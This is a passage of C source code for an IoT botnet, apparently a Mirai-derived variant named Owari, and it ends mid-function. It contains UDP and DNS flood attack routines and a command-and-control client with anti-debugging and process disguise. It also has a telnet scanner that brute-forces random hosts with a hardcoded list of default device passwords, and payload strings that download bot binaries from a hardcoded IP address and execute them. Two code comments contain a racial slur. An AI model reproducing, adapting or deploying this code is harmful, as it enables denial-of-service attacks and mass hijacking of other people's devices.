            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}
void attack_method_udpdns(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 53);
    uint16_t dns_hdr_id = attack_get_opt_int(opts_len, opts, ATK_OPT_DNS_HDR_ID, 0xffff);
    uint8_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 12);
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    int domain_len;
    ipv4_t dns_resolver = get_dns_resolver();
    if (domain == NULL)
    {
        return;
    }
    domain_len = util_strlen(domain);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        int ii;
        uint8_t curr_word_len = 0, num_words = 0;
        struct iphdr *iph;
        struct udphdr *udph;
        struct dnshdr *dnsh;
        char *qname, *curr_lbl;
        struct dns_question *dnst;
        pkts[i] = calloc(600, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        dnsh = (struct dnshdr *)(udph + 1);
        qname = (char *)(dnsh + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = dns_resolver;
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
        dnsh->id = htons(dns_hdr_id);
        dnsh->opts = htons(1 << 8);
        dnsh->qdcount = htons(1);
        *qname++ = data_len;
        qname += data_len;
        curr_lbl = qname;
        util_memcpy(qname + 1, domain, domain_len + 1);
        for (ii = 0; ii < domain_len; ii++)
        {
            if (domain[ii] == '.')
            {
                *curr_lbl = curr_word_len;
                curr_word_len = 0;
                num_words++;
                curr_lbl = qname + ii + 1;
            }
            else
                curr_word_len++;
        }
        *curr_lbl = curr_word_len;
        dnst = (struct dns_question *)(qname + domain_len + 2);
        dnst->qtype = htons(PROTO_DNS_QTYPE_A);
        dnst->qclass = htons(PROTO_DNS_QCLASS_IP);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            struct dnshdr *dnsh = (struct dnshdr *)(udph + 1);
            char *qrand = ((char *)(dnsh + 1)) + 1;
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;
            if (dns_hdr_id == 0xffff)
                dnsh->id = rand_next() & 0xffff;
            rand_alpha_str((uint8_t *)qrand, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
            targs[i].sock_addr.sin_addr.s_addr = dns_resolver;
            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}
void attack_method_udpplain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(65535, sizeof (char));
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
            return;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
			//Nigga
        }
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
			//Nigga
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];
            if (data_rand)
                rand_str(data, data_len);
            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
    }
}
static ipv4_t get_dns_resolver(void)
{
    int fd;
    table_unlock_val(OWARI_RESOLV);
    fd = open(table_retrieve_val(OWARI_RESOLV, NULL), O_RDONLY);
    table_lock_val(OWARI_RESOLV);
    if (fd >= 0)
    {
        int ret, nspos;
        char resolvbuf[2048];
        ret = read(fd, resolvbuf, sizeof (resolvbuf));
        close(fd);
        table_unlock_val(OWARI_NAMESERVER);
        nspos = util_stristr(resolvbuf, ret, table_retrieve_val(OWARI_NAMESERVER, NULL));
        table_lock_val(OWARI_NAMESERVER);
        if (nspos != -1)
        {
            int i;
            char ipbuf[32];
            BOOL finished_whitespace = FALSE;
            BOOL found = FALSE;
            for (i = nspos; i < ret; i++)
            {
                char c = resolvbuf[i];
                if (!finished_whitespace)
                {
                    if (c == ' ' || c == '\t')
                        continue;
                    else
                        finished_whitespace = TRUE;
                }
                if ((c != '.' && (c < '0' || c > '9')) || (i == (ret - 1)))
                {
                    util_memcpy(ipbuf, resolvbuf + nspos, i - nspos);
                    ipbuf[i - nspos] = 0;
                    found = TRUE;
                    break;
                }
            }
            if (found)
            {
                return inet_addr(ipbuf);
            }
        }
    }
    switch (rand_next() % 4)
    {
    case 0:
        return INET_ADDR(8,8,8,8);
    case 1:
        return INET_ADDR(74,82,42,42);
    case 2:
        return INET_ADDR(64,6,64,6);
    case 3:
        return INET_ADDR(4,2,2,2);
    }
}
#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define FALSE 0
#define TRUE 1

typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define FAKE_CNC_ADDR INET_ADDR(1,1,1,1)
#define FAKE_CNC_PORT 23

#define SCANIP (int)inet_addr((const char*)"147.135.23.229");
#define SERVIP (int)inet_addr((const char*)"147.135.23.229");
#define SCAN_PORT 293

#define UPNP_SCAN_PAYLOAD_MIPS "wget http://147.135.23.229/bins/owari.mips; chmod 777 *; ./owari.mips upnp.dasan"
#define UPNP_SCAN_PAYLOAD_MPSL "wget http://147.135.23.229/bins/owari.mpsl; chmod 777 *; ./owari.mpsl upnp.rompager"
#define UPNP_SCAN_PAYLOAD_ARM5 "wget http://147.135.23.229/bins/owari.arm5; chmod 777 *; ./owari.arm5 upnp.goahead"

ipv4_t LOCAL_ADDR;


#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "resolv.h"
#include "killer.h"
#include "scanner.h"
#include "util.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static BOOL unlock_tbl_if_nodebug(char *);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, watchdog_pid = 0;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;

#ifdef DEBUG
    static void segv_handler(int sig, siginfo_t *si, void *unused)
    {
        printf("got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
        exit(EXIT_FAILURE);
    }
#endif


void watchdog_maintain(void)
{
    watchdog_pid = fork();
    if(watchdog_pid > 0 || watchdog_pid == -1)
        return;

    int timeout = 1;
    int watchdog_fd = 0;
    int found = FALSE;

    table_unlock_val(OWARI_CALL);
    table_unlock_val(OWARI_CALL2);

    if((watchdog_fd = open(table_retrieve_val(OWARI_CALL, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(OWARI_CALL2, NULL), 2)) != -1)
    {
        #ifdef DEBUG
            printf("[watchdog] found a valid watchdog driver\n");
        #endif
        found = TRUE;
        ioctl(watchdog_fd, 0x80045704, &timeout);
    }
    
    if(found)
    {
        while(TRUE)
        {
            #ifdef DEBUG
                printf("[watchdog] sending keep-alive ioctl call to the watchdog driver\n");
            #endif
            ioctl(watchdog_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    
    table_lock_val(OWARI_CALL);
    table_lock_val(OWARI_CALL2);

    #ifdef DEBUG
        printf("[watchdog] failed to find a valid watchdog driver, bailing out\n");
    #endif
    
    exit(0);
}


int main(int argc, char **args)
{
    char *tbl_exec_succ, name_buf[32], id_buf[32];
    int name_buf_len = 0, tbl_exec_succ_len = 0, pgid = 0, pings = 0;

    #ifndef DEBUG
        sigset_t sigs;

        sigemptyset(&sigs);
        sigaddset(&sigs, SIGINT);
        sigprocmask(SIG_BLOCK, &sigs, NULL);
        signal(SIGCHLD, SIG_IGN);
        signal(SIGTRAP, &anti_gdb_entry);

    #endif

    #ifdef DEBUG
        printf("DEBUG MODE YO\n");

        sleep(1);
    #endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

    table_init();

    anti_gdb_entry(0);

    rand_init();
	
    util_zero(id_buf, 32);
    if(argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    name_buf_len = (rand_next() % (20 - util_strlen(args[0]))) + util_strlen(args[0]);
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);

    util_zero(name_buf, 32);

    name_buf_len = (rand_next() % (20 - util_strlen(args[0]))) + util_strlen(args[0]);
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(PR_SET_NAME, name_buf);

    table_unlock_val(OWARI_BOT_DEPLOY);
    tbl_exec_succ = table_retrieve_val(OWARI_BOT_DEPLOY, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(OWARI_BOT_DEPLOY);

    attack_init();
    killer_init();
    watchdog_maintain();

#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    attack_init();
    killer_init();
    watchdog_maintain();
    scanner_init();
	
    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        if(pending_connection)
        {
            pending_connection = FALSE;

            if(!FD_ISSET(fd_serv, &fdsetwr))
            {
                #ifdef DEBUG
                    printf("[main] timed out while connecting to CNC\n");
                #endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err != 0)
                {
                    #ifdef DEBUG
                        printf("[main] error while connecting to CNC code=%d\n", err);
                    #endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof(id_len), MSG_NOSIGNAL);
                    if(id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }

                    #ifdef DEBUG
                        printf("[main] connected to CNC.\n");
                    #endif
                }
            }
        }
        else if(fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n = 0;
            uint16_t len = 0;
            char rdbuf[1024];

            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 1\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            if(len == 0)
            {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
                continue;
            }
            len = ntohs(len);
            if(len > sizeof(rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
                continue;
            }

            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 2\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

            #ifdef DEBUG
                printf("[main] received %d bytes from CNC\n", len);
            #endif

            if(len > 0)
                attack_parse(rdbuf, len);
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    #ifndef USEDOMAIN
    table_unlock_val(OWARI_PORT);
    srv_addr.sin_addr.s_addr = SERVIP;
    srv_addr.sin_port = *((port_t *)table_retrieve_val(OWARI_PORT, NULL));
    table_lock_val(OWARI_PORT);
    #else
    struct resolv_entries *entries;
    entries = resolv_lookup(SERVDOM);
    if (entries == NULL)
    {
        srv_addr.sin_addr.s_addr = SERVIP;
        return;
    } else {
        srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    }
    
    resolv_entries_free(entries);
    table_unlock_val(OWARI_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(OWARI_PORT, NULL));
    table_lock_val(OWARI_PORT);
    #endif
}

static void establish_connection(void)
{
    #ifdef DEBUG
        printf("[main] attempting to connect to CNC\n");
    #endif

    if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[main] failed to call socket(). Errno = %d\n", errno);
        #endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    if(resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}

static void teardown_connection(void)
{
    #ifdef DEBUG
        printf("[main] tearing down connection to CNC!\n");
    #endif

    if(fd_serv != -1)
        close(fd_serv);

    fd_serv = -1;
    sleep(1);
}

#define _GNU_SOURCE


#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "includes.h"
#include "scanner.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"
#include "resolv.h"

int scanner_pid, rsck, rsck_out, auth_table_len = 0;
char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
struct scanner_auth *auth_table = NULL;
struct scanner_connection *conn_table;
uint16_t auth_table_max_weight = 0;
uint32_t fake_time = 0;

int recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if (ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if (((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

void scanner_init(void)
{
    int i;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    scanner_pid = fork();
    if (scanner_pid > 0 || scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    fake_time = time(NULL);
    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
    for (i = 0; i < SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = SC_CLOSED;
        conn_table[i].fd = -1;
    }

    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to initialize raw socket, cannot scan\n");
#endif
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    {
#ifdef DEBUG
        printf("[scanner] Failed to set IP_HDRINCL, cannot scan\n");
#endif
        close(rsck);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while (ntohs(source_port) < 1024);

    iph = (struct iphdr *)scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;

    // The number after is not the XOR length you retards dont change it.
    add_auth_entry("default", "lJwpbo6", 10);
    add_auth_entry("default", "S2fGqNFs", 10);
    add_auth_entry("default", "OxhlwSG8", 10);
    add_auth_entry("default", "default", 10);
    add_auth_entry("volition", "volition", 5);
    add_auth_entry("support", "support", 5);
    add_auth_entry("admin", "CenturyL1nk", 9);
    add_auth_entry("admin", "admin", 9);
    add_auth_entry("admin", "dvr2580222", 5);
    add_auth_entry("admin", "ho4uku6at", 9);
    add_auth_entry("admin", "Win1doW$", 8);
    add_auth_entry("admin", "meinsm", 8);
    add_auth_entry("admin", "pass", 10);
    add_auth_entry("root", "ipcam_rt5350", 10);
    add_auth_entry("root", "5up", 8);
    add_auth_entry("root", "root", 7);
    add_auth_entry("root", "antslq", 7);
    add_auth_entry("root", "zsun1188", 5);
    add_auth_entry("root", "hi3518", 6);
    add_auth_entry("root", "hunt5759", 4);
    add_auth_entry("root", "klv123", 3);
    add_auth_entry("root", "vertex25ektks123", 3);
    add_auth_entry("root", "vizxv", 2);
    add_auth_entry("root", "xc3511", 6);
    add_auth_entry("root", "xmhdipc", 3);
    add_auth_entry("root", "zlxx.", 5);
    add_auth_entry("root", "Zte521", 4);
    add_auth_entry("root", "zte9x15", 5);
    add_auth_entry("user", "user", 1);
    add_auth_entry("user", "12345", 1);
    add_auth_entry("user", "1234", 1);
    add_auth_entry("root", "88888888", 1);
    add_auth_entry("root", "1234", 1);
    add_auth_entry("admin", "admin123", 1);
    add_auth_entry("admin", "123", 1);
    add_auth_entry("admin", "fliradmin", 1);
    add_auth_entry("admin", "2601hx", 1);
    add_auth_entry("admin", "conexant", 1);
    add_auth_entry("admin", "Uq-4GIt3M", 1);
    add_auth_entry("admin", "zoomadsl", 1);
    add_auth_entry("memotec", "supervisor", 1);
    add_auth_entry("root", "ahetzip8", 1);
    add_auth_entry("root", "cms500", 1);
    add_auth_entry("telecomadmin", "nE7jA%5m", 1);
    add_auth_entry("vstarcam2015", "20150602", 1);
    add_auth_entry("root", "Serv4EMC", 1);
    add_auth_entry("root", "GM8182", 1);
    add_auth_entry("mg3500", "merlin", 1);
    add_auth_entry("root", "3ep5w2u", 1);
	
    while (TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        struct scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        if (fake_time != last_spew)
        {
            last_spew = fake_time;

            for (i = 0; i < SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
                if (i % 10 == 0)
                {
                    tcph->dest = htons(2323);
                }
                else
                {
                    tcph->dest = htons(23);
                }
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
            }
        }

        last_avail_conn = 0;
        while (TRUE)
        {
            int n;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct scanner_connection *conn;

            errno = 0;
            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
                continue;
            if (tcph->source != htons(23) && tcph->source != htons(2323))
                continue;
            if (tcph->dest != source_port)
                continue;
            if (!tcph->syn)
                continue;
            if (!tcph->ack)
                continue;
            if (tcph->rst)
                continue;
            if (tcph->fin)
                continue;
            if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
            {
                if (conn_table[n].state == SC_CLOSED)
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            if (conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);
#ifdef DEBUG
            printf("[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
#endif
        }

        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            int timeout;

            conn = &conn_table[i];
            timeout = (conn->state > SC_CONNECTING ? 30 : 5);

            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
            {
#ifdef DEBUG
                printf("[scanner] FD%d timed out (state = %d)\n", conn->fd, conn->state);
#endif
                close(conn->fd);
                conn->fd = -1;

                if (conn->state > SC_HANDLE_IACS)
                {
                    if (++(conn->tries) == 10)
                    {
                        conn->tries = 0;
                        conn->state = SC_CLOSED;
                    }
                    else
                    {
                        setup_connection(conn);
#ifdef DEBUG
                        printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                    }
                }
                else
                {
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                }
                continue;
            }

            if (conn->state == SC_CONNECTING)
            {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
                    conn->state = SC_HANDLE_IACS;
                    conn->auth = random_auth_entry();
                    conn->rdbuf_pos = 0;
#ifdef DEBUG
                    printf("[scanner] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
#endif
                }
                else
                {
#ifdef DEBUG
                    printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                    continue;
                }
            }

            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                while (TRUE)
                {
                    int ret;

                    if (conn->state == SC_CLOSED)
                        break;

                    if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }
                    errno = 0;
                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if (ret == 0)
                    {
#ifdef DEBUG
                        printf("[scanner] FD%d connection gracefully closed\n", conn->fd);
#endif
                        errno = ECONNRESET;
                        ret = -1;
                    }
                    if (ret == -1)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK)
                        {
#ifdef DEBUG
                            printf("[scanner] FD%d lost connection\n", conn->fd);
#endif
                            close(conn->fd);
                            conn->fd = -1;

                            if (++(conn->tries) >= 10)
                            {
                                conn->tries = 0;
                                conn->state = SC_CLOSED;
                            }
                            else
                            {
                                setup_connection(conn);
#ifdef DEBUG
                                printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                            }
                        }
                        break;
                    }
                    conn->rdbuf_pos += ret;
                    conn->last_recv = fake_time;

                    while (TRUE)
                    {
                        int consumed = 0;

                        switch (conn->state)
                        {
                        case SC_HANDLE_IACS:
                            if ((consumed = consume_iacs(conn)) > 0)
                            {
                                conn->state = SC_WAITING_USERNAME;
#ifdef DEBUG
                                printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_USERNAME:
                            if ((consumed = consume_user_prompt(conn)) > 0)
                            {
                                send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
